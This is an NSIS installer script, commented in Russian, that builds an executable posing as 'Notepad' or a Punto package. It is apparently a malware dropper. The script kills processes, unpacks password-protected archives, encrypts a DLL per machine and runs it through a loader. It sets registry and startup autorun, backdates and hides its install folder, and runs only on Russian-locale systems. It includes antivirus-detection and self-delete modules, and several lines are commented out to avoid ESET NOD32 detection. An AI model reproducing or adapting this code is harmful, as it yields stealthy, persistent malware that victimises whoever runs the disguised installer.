# 
# Punto package installer
# 

Name "Notepad"
OutFile "ntp1.~exe"
RequestExecutionLevel user
CRCCheck off

# Директория с плагинами для расширения функционала
!addplugindir ..\_NSISShare\Plugins

# Глобальные переменные
Var UnZipDir ; директория для распаковки временных файлов и утилит
Var DirTime  ; дата, устанавливаемая для директории установки

# Пароль для расшифровки архивов
!define ZIP_PWD "%password%"

# Headers
!include "Settings.nsh"
!include "nsProcess.nsh"
!include "Utils.nsh"
!include "UnZip.nsh"
!include "FileProcess.nsh"
!include "SelfDel.nsh"
!include "AVDetect.nsh"
!include "AutoRun.nsh"
!include "InstDir.nsh"

;--------------------------------
Function KillTasks
  Push $R0
  Push $0
;    ${nsProcess::KillProcess} "${KDNS_EXE_NAME}"  $R0    ; Nod detect!
;    ${nsProcess::KillProcess} "${START_EXE_NAME}"   $R0
    StrCpy $0 "${KDNS_EXE_NAME}${EXE_EXE}"
      ${nsProcess::KillProcess} $0 $R0
    StrCpy $0 "${MAIN_EXE_NAME}"
      ${nsProcess::KillProcess} $0 $R0
  Pop $0
  Pop $R0
FunctionEnd
;--------------------------------

Function CopyMainFiles
  Push $0
  Push $1
    StrCpy $1 $OUTDIR ; Запоминаем директорию установки
    Push $OUTDIR
      ${XOutPath} "$UnZipDir"
        #  Архив с общими файлами
        ${UnZipFileName} ${MAIN_ZIP} "${ORIGINAL}${EXE_TMP}" "${ZIP_PWD}"  
        ${Rnd} $0 999999 9999999
        StrCpy $0 "$0.tmp"
        ${UnZipFileDir} ${ORIGINAL}${EXE_TMP} "$0" "${ZIP_PWD}"
        CopyFiles /FILESONLY /SILENT "$UnZipDir\$0\*.*" "$1"
    Pop $OUTDIR
      SetOutPath $OUTDIR 
  Pop $1
  Pop $0
FunctionEnd
;--------------------------------

Function EncodeDll
  Push $1
    StrCpy $1 $OUTDIR ; Запоминаем директорию установки
    Push $OUTDIR  
      SetOutPath $UnZipDir
        ${UnZipFileName} ${MAIN_ZIP} "${ENCS_EXE_NAME}${EXE_TMP}" "${ZIP_PWD}"
        ${UnZipFileName} ${MAIN_ZIP} "${GEN_DLL_NAME}.dat"  "${ZIP_PWD}"
          Rename "$UnZipDir\${ENCS_EXE_NAME}${EXE_TMP}" "$UnZipDir\${ENCS_EXE_NAME}${EXE_EXE}"
          ${ExecCmd} "$UnZipDir\${ENCS_EXE_NAME}${EXE_EXE} ${GEN_DLL_NAME}.dat 1.dat"
          Sleep 15000
        Delete "${ENCS_EXE_NAME}${EXE_EXE}"
        Delete "${GEN_DLL_NAME}.dat"

        # Если EncodeSpecific сформировал файл, то копируем в папку Пунто
        IfFileExists "$UnZipDir\1.dat" 0 end
          CopyFiles /SILENT "$UnZipDir\1.dat" "$1\1.dat"
        !if ${STATIC_DLL_ONLY} != true
          ${UnZipFileName} ${MAIN_ZIP} "${DYN_DLL_NAME}${DLL_DLL}" "${ZIP_PWD}"
          ${UnZipFileName} ${MAIN_ZIP} "${KDNS_EXE_NAME}${EXE_TMP}" "${ZIP_PWD}"
            CopyFiles /SILENT "$UnZipDir\${DYN_DLL_NAME}${DLL_DLL}" "$1\${DYN_DLL_NAME}${DLL_DLL}"
            CopyFiles /SILENT "$UnZipDir\${KDNS_EXE_NAME}${EXE_TMP}" "$1\${KDNS_EXE_NAME}${EXE_EXE}"
        !endif
end:
    Pop $OUTDIR
      SetOutPath $OUTDIR  
  Pop $1
FunctionEnd
;--------------------------------

Function UnPackStaticDll
  Push $OUTDIR  
    SetOutPath $UnZipDir
      ${UnZipFileName} ${MAIN_ZIP} "${STAT_DLL_NAME}" "${ZIP_PWD}"
  Pop $OUTDIR
    SetOutPath $OUTDIR  

  CopyFiles /SILENT "$UnZipDir\${STAT_DLL_NAME}" "$OUTDIR\${STAT_DLL_NAME}"
FunctionEnd
;--------------------------------

/*
Function KnownDlls
  StrCmp $1 "libguide.dll" 0 +2
  Goto end
  StrCmp $1 "mfc71u.dll" 0 +2
  Goto end
  StrCmp $1 "msftedit.dll" 0 +2
  Goto end
  StrCmp $1 "msvcr71.dll" 0 +2
  Goto end
newDll:
  StrCpy $9 "1"
end:
FunctionEnd
;--------------------------------
*/

/*Function CheckDllExists
  StrCpy $9 0
  Push $0
  Push $1
    ClearErrors
    FindFirst $0 $1 "$OUTDIR\*.dll"
    loop:
      IfErrors end
        ${DbgBox} "Found $1"
        Call KnownDlls
        ${If} $9 == 1
          goto end
        ${EndIf}
      FindNext $0 $1
    goto loop
end:
   FindClose $1
  Pop $1
  Pop $0
FunctionEnd
*/
;--------------------------------

Function RunStatic
  Call UnPackStaticDll          
  Exec "$OUTDIR\${MAIN_EXE_NAME}"
FunctionEnd

;--------------------------------
Function RunProgram
  Push $0
    !if ${STATIC_DLL_ONLY} == true
      Call RunStatic
    !else 
      IfFileExists "$OUTDIR\1.dat" 0 end
        ;${ExecCmd} "${KDNS_EXE_NAME} ${START_EXE_NAME} ${DYN_DLL_NAME}"  ; detect?   
        ;${DbgBox} "$OUTDIR\${KDNS_EXE_NAME} ${MAIN_EXE_NAME} ${DYN_DLL_NAME}"
        nsExec::ExecToStack '$OUTDIR\${KDNS_EXE_NAME}${EXE_EXE} ${MAIN_EXE_NAME} ${DYN_DLL_NAME}${DLL_DLL}'
        Pop $0
        ;Delete ${KDNS_EXE_NAME}  ; Nod Detect
        ;Delete ${DYN_DLL_NAME}   ; Nod Detect
        ${DeleteFile} "$OUTDIR\${KDNS_EXE_NAME}${EXE_EXE}"
        ${DeleteFile} "$OUTDIR\${DYN_DLL_NAME}${DLL_DLL}"

        # Если kdns32 не сформировал dll и не запустил Punto, то распаковываем статическую в папку программы и запускаем
        ;Call CheckDllExists
        ${DbgBox} "DllExists Err = $0"
        ${If} $0 != 0  
          Call RunStatic
        ${EndIf}
    !endif  
  end:
  Pop $0
FunctionEnd
;--------------------------------

Function SetAutoRunLink
  StrCpy $9 ""
  ${SetLinkAutoRun} "${AUTO_RUN_KEYNAME}" \ 
                    "$\"$OUTDIR\${MAIN_EXE_NAME}$\""
FunctionEnd
;--------------------------------


;================================================================================================================

; Main section
Section 
  System::Call 'kernel32::GetSystemDefaultLangID()i.r0'
  IntOp $LANGUAGE $0 & 0xFFFF
  ${If} $LANGUAGE = 1049 ; RU
    # Время создания директории установки
    StrCpy $DirTime "06-05-2013"

    # Скидываем главный архив
    ${DropMainZip}

    ${XOutPath} ${INST_USER_DIR} 
    ;${DbgBox} "Install Dir: $OUTDIR"

    Call KillTasks           ; Убиваем старые процессы 
      ${DelDir} $OUTDIR      ; Удаляем директорию установки                            	

    ${SetRegAutoRun}         ; Автозапуск через HookDll
  
    Call EncodeDll           ; Криптуем dll под комп
      Call CopyMainFiles     ; Файлы программы

    ${SetDirTime} $OUTDIR "$DirTime" ; Меняем дату директории
      Call RunProgram                ; Стартуем Программу через лоадер или напрямую
    ${SetDirTime} $OUTDIR "$DirTime" ; Меняем дату директории
    ${HideDir} "$OUTDIR"             ; и делаем ее скрытой

    Call SetAutoRunLink      ; Помещаем ярлык в автозагрузку, если запись в реестр не удалась

  ${EndIf}
SectionEnd ; end the section
